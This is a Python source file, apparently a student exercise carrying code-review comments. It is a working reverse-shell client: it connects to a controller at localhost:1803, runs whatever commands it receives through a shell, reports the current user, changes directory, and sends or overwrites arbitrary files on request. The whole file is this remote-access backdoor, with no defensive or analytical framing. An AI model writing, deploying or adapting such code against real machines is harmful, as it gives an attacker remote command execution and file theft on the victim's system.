# CR: Are you handling exceptions correctly?
# CR: Split the main to functions. Main should not be more than 5 lines.
# !/bin/python3
'''
Author: Gal Davidi
'''

import socket
import os
import sys
import subprocess
import getpass
import logging

SERVER = 'localhost'
PORT = 1803
BUFFER = 1024
CODING = "utf-8"
END_MSG = 'exit'
GET_FILE_TRIGER = 'get'
PUT_FILE_TRIGER = 'put'
FORMAT = "%(asctime)s - %(message)s"
DATE_FMT = "%d/%m/%Y %I:%M:%S"
LOG_LEVEL = 'INFO'

logging.basicConfig(filename="client.log", format=FORMAT, datefmt=DATE_FMT, level=LOG_LEVEL)


def put_file(connection):
    '''get file from the server'''
    file_path = connection.recv(BUFFER)
    try:
        with open(file_path, 'wb') as file:
            while True:
                data = connection.recv(BUFFER)
                if data == 'eof'.encode(CODING):
                    break
                file.write(data)
    except Exception as exp:
        logging.error(exp)


def get_file(connection):
    '''upload file to the server'''
    try:
        file_path = connection.recv(BUFFER)
        with open(file_path, 'rb') as file:
            data = file.read(BUFFER)
            while data:
                connection.send(data)
                data = file.read(BUFFER)
        connection.send(b'eof')
    except Exception as exp:
        logging.error(exp)


def server_connection(remote_ip, port):
    '''
    connect to the server
    '''
    global sock
    sock = socket.socket()
    server_address = (remote_ip, port)
    print('connecting to {} port {}'.format(*server_address))
    logging.info('connecting to {} port {}'.format(*server_address))
    try:
        sock.connect(server_address)
        return sock
    except ConnectionError as exp:
        logging.error(exp)


def command_receiver(sock):
    '''
    recive the commands from the server
    :param sock:
    :return:
    '''
    try:
        while True:
            data = sock.recv(BUFFER)
            if len(data) > 0:
                data = data.decode(CODING)
                logging.info(data)
                if data == END_MSG:
                    sock.send(END_MSG.encode(CODING))
                    sock.close()
                    sys.exit(0)
                elif data == "whoami":
                    sock.send((getpass.getuser()).encode(CODING))
                elif data == GET_FILE_TRIGER:
                    get_file(sock)
                elif data == PUT_FILE_TRIGER:
                    put_file(sock)
                elif data[:2] == 'cd':
                    os.chdir(data[3:])
                elif len(data) > 1:
                    output = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE,
                                              stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                    output = (output.stdout.read() + output.stderr.read()).decode(CODING)
                    logging.info(f"out: {output}")
                    sock.send(f"{os.getcwd()}$ {output}".encode(CODING))

    except ConnectionResetError as reset:
        logging.error(reset)


def main():
    server_socket = server_connection(SERVER, PORT)
    command_receiver(server_socket)


if __name__ == '__main__':
    main()
